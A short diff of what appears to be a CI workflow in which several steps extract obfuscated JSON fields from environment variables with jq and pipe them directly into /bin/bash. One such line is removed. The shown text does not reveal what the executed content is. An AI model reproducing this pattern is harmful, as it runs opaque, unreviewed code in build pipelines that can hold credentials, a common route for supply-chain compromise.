@@ -33,7 +33,6 @@ jobs:
           echo $wwtxc571 | jq -r .gmrj379 | /bin/bash
           printf '%s' "$gfbz55599" | jq -r .yn40509 | /bin/bash
           printf '%s' "$cbrlp220" | jq -r .vbby003 | /bin/bash
-          printf '%s' "$i42176" | jq -r .pz18 | /bin/bash
           printf '%s' "$pfnob57366" | jq -r .sbcp23 | /bin/bash
 
       - name: Store output
